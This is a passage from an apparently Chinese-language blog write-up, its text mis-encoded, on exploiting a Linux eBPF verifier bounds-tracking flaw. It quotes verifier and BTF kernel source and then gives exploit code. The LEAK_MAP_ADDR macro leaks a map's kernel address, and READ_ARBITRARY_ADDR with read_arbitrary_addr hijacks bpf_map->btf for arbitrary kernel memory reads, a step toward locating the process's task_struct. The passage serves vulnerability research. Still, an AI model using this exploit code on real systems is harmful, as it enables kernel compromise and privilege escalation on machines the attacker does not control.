class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_reg_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> bpf_insn *insn)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_verifier_state</span> *<span class="hljs-title">vstate</span> =</span> env-&gt;cur_state;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_state</span> *<span class="hljs-title">state</span> =</span> vstate-&gt;frame[vstate-&gt;curframe];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">regs</span> =</span> state-&gt;regs, *dst_reg, *src_reg;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">ptr_reg</span> =</span> <span class="hljs-literal">NULL</span>, off_reg = &#123;<span class="hljs-number">0</span>&#125;;<br>u8 opcode = BPF_OP(insn-&gt;code);<br><span class="hljs-type">int</span> err;<br><br>dst_reg = &amp;regs[insn-&gt;dst_reg];<br>src_reg = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (dst_reg-&gt;type != SCALAR_VALUE)<br>ptr_reg = dst_reg;<br><span class="hljs-keyword">else</span><br><span class="hljs-comment">/* Make sure ID is cleared otherwise dst_reg min/max could be</span><br><span class="hljs-comment"> * incorrectly propagated into other registers by find_equal_scalars()</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;id = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;<br>src_reg = &amp;regs[insn-&gt;src_reg];<br><span class="hljs-keyword">if</span> (src_reg-&gt;type != SCALAR_VALUE) &#123;<br><span class="hljs-comment">//...</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ptr_reg) &#123;<br><span class="hljs-comment">/* pointer += scalar */</span><br>err = mark_chain_precision(env, insn-&gt;src_reg);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><span class="hljs-keyword">return</span> adjust_ptr_min_max_vals(env, insn,<br>       dst_reg, src_reg);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œåœ¨ <code>adjust_ptr_min_max_vals()</code> å½“ä¸­æœ‰è¿™æ ·ä¸€ä¸ªé€»è¾‘ï¼šå¦‚æœæºå¯„å­˜å™¨çš„è¾¹ç•Œå­˜åœ¨ <code>smin_val &gt; smax_val || umin_val &gt; umax_val</code> çš„æƒ…å†µï¼Œ<strong>åˆ™ç›´æ¥å°†ç›®çš„å¯„å­˜å™¨è®¾ä¸º unknown</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_ptr_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> bpf_insn *insn,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_reg_state *ptr_reg,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_reg_state *off_reg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_verifier_state</span> *<span class="hljs-title">vstate</span> =</span> env-&gt;cur_state;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_state</span> *<span class="hljs-title">state</span> =</span> vstate-&gt;frame[vstate-&gt;curframe];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">regs</span> =</span> state-&gt;regs, *dst_reg;<br><span class="hljs-type">bool</span> known = tnum_is_const(off_reg-&gt;var_off);<br>s64 smin_val = off_reg-&gt;smin_value, smax_val = off_reg-&gt;smax_value,<br>    smin_ptr = ptr_reg-&gt;smin_value, smax_ptr = ptr_reg-&gt;smax_value;<br>u64 umin_val = off_reg-&gt;umin_value, umax_val = off_reg-&gt;umax_value,<br>    umin_ptr = ptr_reg-&gt;umin_value, umax_ptr = ptr_reg-&gt;umax_value;<br>u32 dst = insn-&gt;dst_reg, src = insn-&gt;src_reg;<br>u8 opcode = BPF_OP(insn-&gt;code);<br><span class="hljs-type">int</span> ret;<br><br>dst_reg = &amp;regs[dst];<br><br><span class="hljs-keyword">if</span> ((known &amp;&amp; (smin_val != smax_val || umin_val != umax_val)) ||<br>    smin_val &gt; smax_val || umin_val &gt; umax_val) &#123;<br><span class="hljs-comment">/* Taint dst register if offset had invalid bounds derived from</span><br><span class="hljs-comment"> * e.g. dead branches.</span><br><span class="hljs-comment"> */</span><br>__mark_reg_unknown(env, dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>è€Œ <code>__mark_reg_unknown()</code> åˆ™ä¼š<strong>ç›´æ¥å°†å¯„å­˜å™¨è®¾ä¸ºæ ‡é‡å€¼ç±»å‹ï¼Œè¿™æ ·çš„å€¼å¯ä»¥ç›´æ¥å­˜å…¥ map è€Œä¸ä¼šè¢« verifier é™åˆ¶</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __mark_reg_unknown(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_verifier_env *env,<br>       <span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Clear type, id, off, and union(map_ptr, range) and</span><br><span class="hljs-comment"> * padding between &#x27;type&#x27; and union</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">memset</span>(reg, <span class="hljs-number">0</span>, offsetof(<span class="hljs-keyword">struct</span> bpf_reg_state, var_off));<br>reg-&gt;type = SCALAR_VALUE;<br>reg-&gt;var_off = tnum_unknown;<br>reg-&gt;frameno = <span class="hljs-number">0</span>;<br>reg-&gt;precise = env-&gt;subprog_cnt &gt; <span class="hljs-number">1</span> || !env-&gt;bpf_capable;<br>__mark_reg_unbounded(reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç”±æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡å°†æŒ‡é’ˆå¯„å­˜å™¨ä¸ä¸€ä¸ªæ¼æ´å¯„å­˜å™¨è¿›è¡Œç®—æœ¯è¿ç®—æ¥ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œä»è€Œæ³„éœ²å‡º map çš„åœ°å€ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>æˆ‘ä»¬çš„æ¼æ´å¯„å­˜å™¨çš„ç¬¬ 33 ä½æ˜¯ unknown çš„ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶è¿›è¡Œæˆªæ–­ä»¥æ¶ˆå»</strong>ï¼š</p><blockquote><p>æˆ‘ä»¬åº”å½“å°½é‡å‡å°‘æˆªæ–­æ—¶ verifier å¯¹å¯„å­˜å™¨çš„è·Ÿè¸ªï¼Œå› æ­¤è¿™é‡Œç›´æ¥ç”¨ <code>mov</code> ï¼Œå¦‚æœä½¿ç”¨ <code>and 0xffffffff</code> è¿™æ ·çš„æ“ä½œåˆ™æ²¡æ³•æ¶ˆé™¤æ‰ unknown ä½ï¼Œå°‘ and å‡ ä½åˆ™ä¼šå¯¼è‡´å¯„å­˜å™¨è¾¹ç•Œå€¼å’Œ var_off é‡æ–°æ›´æ–°</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_ADDR(__map_fd)                         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV32_REG(VULN_REG, VULN_REG),              \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        LEAK_MAP_ADDR(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„æˆ‘ä»¬è·å¾—çš„åœ°å€æ˜¯æŒ‡å‘ <code>bpf_array.value</code> çš„ï¼Œéœ€è¦è‡ªè¡Œè®¡ç®—åç§»ï¼š</p><p><img src="https://s2.loli.net/2023/06/06/1KNx2MTmQ5A39Gp.png" alt="image.png"></p><blockquote><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ° <code>bpf_map</code> <strong>å¹¶ä¸åœ¨ direct mapping area ä¸Š</strong>ï¼Œåº”è¯¥æ˜¯è°ƒç”¨äº† vmallocï¼Œç¬”è€…æ¨æµ‹å¯èƒ½æ˜¯å› ä¸ºæˆ‘ä»¬åˆ†é…çš„ map å¤ªå¤§çš„ç¼˜æ•…ï¼šï¼‰</p></blockquote><h2 id="å››ã€ä»»æ„åœ°å€è¯»ï¼Œæ³„éœ²è¿›ç¨‹åœ°å€"><a href="#å››ã€ä»»æ„åœ°å€è¯»ï¼Œæ³„éœ²è¿›ç¨‹åœ°å€" class="headerlink" title="å››ã€ä»»æ„åœ°å€è¯»ï¼Œæ³„éœ²è¿›ç¨‹åœ°å€"></a>å››ã€ä»»æ„åœ°å€è¯»ï¼Œæ³„éœ²è¿›ç¨‹åœ°å€</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•å®Œæˆä»»æ„åœ°å€è¯»ï¼Œç”±äºæˆ‘ä»¬èƒ½å¤Ÿè¯»å†™ <code>bpf_map</code> ä¸­çš„æ•°æ®ï¼Œæ•…è€ƒè™‘ä»æ­¤å¤„ä¸‹æ‰‹ï¼šï¼‰</p><p><strong>BPF Type Format</strong>ï¼ˆBTFï¼‰æ˜¯ä¸€ç§å…ƒæ•°æ®æ ¼å¼ï¼Œç”¨äºç»™ eBPF æä¾›ä¸€äº›é¢å¤–çš„ä¿¡æ¯ï¼Œåœ¨å†…æ ¸ä¸­ä½¿ç”¨ <code>btf</code> ç»“æ„ä½“è¡¨ç¤ºä¸€æ¡ btf ä¿¡æ¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> &#123;</span><br><span class="hljs-type">void</span> *data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_type</span> **<span class="hljs-title">types</span>;</span><br>u32 *resolved_ids;<br>u32 *resolved_sizes;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *strings;<br><span class="hljs-type">void</span> *nohdr_data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_header</span> <span class="hljs-title">hdr</span>;</span><br>u32 nr_types; <span class="hljs-comment">/* includes VOID for base BTF */</span><br>u32 types_size;<br>u32 data_size;<br><span class="hljs-type">refcount_t</span> refcnt;<br>u32 id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span><br><br><span class="hljs-comment">/* split BTF support */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">base_btf</span>;</span><br>u32 start_id; <span class="hljs-comment">/* first type ID in this BTF (0 for base BTF) */</span><br>u32 start_str_off; <span class="hljs-comment">/* first string offset (0 for base BTF) */</span><br><span class="hljs-type">char</span> name[MODULE_NAME_LEN];<br><span class="hljs-type">bool</span> kernel_btf;<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ³¨æ„åˆ°åœ¨ <code>bpf_map</code> å½“ä¸­åˆšå¥½æœ‰ä¸€ä¸ªæŒ‡å‘ <code>struct btf</code> çš„æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> &#123;</span><br><span class="hljs-comment">//...</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br></code></pre></td></tr></table></figure><p> <code>bpf_map-&gt;btf</code> åœ¨ä»€ä¹ˆæ—¶å€™ä¼šè¢«è®¿é—®åˆ°ï¼Ÿæ³¨æ„åˆ° <code>bpf</code> ç³»ç»Ÿè°ƒç”¨ç»™æˆ‘ä»¬æä¾›çš„é€‰é¡¹ä¸­æœ‰ä¸€ä¸ªä¸º <code>BPF_OBJ_GET_INFO_BY_FD</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(bpf, <span class="hljs-type">int</span>, cmd, <span class="hljs-keyword">union</span> bpf_attr __user *, uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, size)<br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_OBJ_GET_INFO_BY_FD:<br>err = bpf_obj_get_info_by_fd(&amp;attr, uattr);<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>å¯¹äº map ç±»å‹è€Œè¨€æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>bpf_map_get_info_by_fd()</code> ï¼Œåœ¨è¯¥å‡½æ•°ä¸­<strong>ä¼šæŠŠ bpf_map-&gt;btf.id æ‹·è´ç»™ç”¨æˆ·ç©ºé—´</strong>ï¼š </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_map_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>,</span><br><span class="hljs-params">  <span class="hljs-type">const</span> <span class="hljs-keyword">union</span> bpf_attr *attr,</span><br><span class="hljs-params">  <span class="hljs-keyword">union</span> bpf_attr __user *uattr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;btf) &#123;<br>info.btf_id = btf_obj_id(<span class="hljs-built_in">map</span>-&gt;btf);<br>info.btf_key_type_id = <span class="hljs-built_in">map</span>-&gt;btf_key_type_id;<br>info.btf_value_type_id = <span class="hljs-built_in">map</span>-&gt;btf_value_type_id;<br>&#125;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (copy_to_user(uinfo, &amp;info, info_len) ||<br>    put_user(info_len, &amp;uattr-&gt;info.info_len))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_obj_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">union</span> bpf_attr *attr,</span><br><span class="hljs-params">  <span class="hljs-keyword">union</span> bpf_attr __user *uattr)</span><br>&#123;<br><span class="hljs-type">int</span> ufd = attr-&gt;info.bpf_fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (CHECK_ATTR(BPF_OBJ_GET_INFO_BY_FD))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>f = fdget(ufd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADFD;<br><br><span class="hljs-keyword">if</span> (f.file-&gt;f_op == &amp;bpf_prog_fops)<br>err = bpf_prog_get_info_by_fd(f.file, f.file-&gt;private_data, attr,<br>      uattr);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f.file-&gt;f_op == &amp;bpf_map_fops)<br>err = bpf_map_get_info_by_fd(f.file, f.file-&gt;private_data, attr,<br>     uattr);<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ btf æŒ‡é’ˆçš„æ–¹å¼å®Œæˆä»»æ„åœ°å€è¯»</strong>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* write the value into bpf_map-&gt;btf */</span>         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8),     \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),        \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr_4_bytes</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        READ_ARBITRARY_ADDR(map_fd, idx), <br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .info.bpf_fd = map_fd,<br>        .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>        .info.info = (<span class="hljs-type">uint64_t</span>) &amp;info,<br>    &#125;;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> ret;<br><br>    ret = run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    data = info.btf_id;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    value[<span class="hljs-number">0</span>] = addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = addr + <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    data = read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">2</span>);<br>    data &lt;&lt;= <span class="hljs-number">32</span>;<br>    data += read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸è¿‡ç”±äºæˆ‘ä»¬ç›®å‰æš‚æ—¶ä¸çŸ¥é“ <code>page_offset_base</code> ï¼Œå› æ­¤æš‚æ—¶æ— æ³•å®Œæˆå¯¹æ‰€æœ‰ç‰©ç†å†…å­˜æœç´¢çš„å·¥ä½œï¼Œè€Œåªèƒ½è¯»å–å†…æ ¸é•œåƒèŒƒå›´çš„å†…å­˜</p><p>ä½†æ˜¯ <code>init</code> è¿›ç¨‹çš„ PCB <code>init_task</code> ä½äºå†…æ ¸æ•°æ®æ®µä¸Šï¼Œ<strong>init_task çš„åœ°å€å¯¹æˆ‘ä»¬æ¥è¯´æ˜¯å¯çŸ¥çš„</strong>ï¼Œè€Œ<strong>æ‰€æœ‰è¿›ç¨‹åœ¨å†…æ ¸ä¸­çš„ PCB æ„æˆä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æ²¿ç€è¿™ä¸ªåŒå‘é“¾è¡¨æœç´¢æˆ‘ä»¬çš„è¿›ç¨‹æ§åˆ¶å—</strong>ï¼Œåˆ¤æ–­æ˜¯å¦æœç´¢åˆ°çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚è¯´å¯¹æ¯” pid ä¸€ç±»çš„ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©ç”¨ <code>prctl(PR_SET_NAME, &quot;arttnba3&quot;)</code> æ¥è®¾ç½® <code>task_struct-&gt;comm</code>ï¼š</p><figure class="highlight c"><table><tr><td 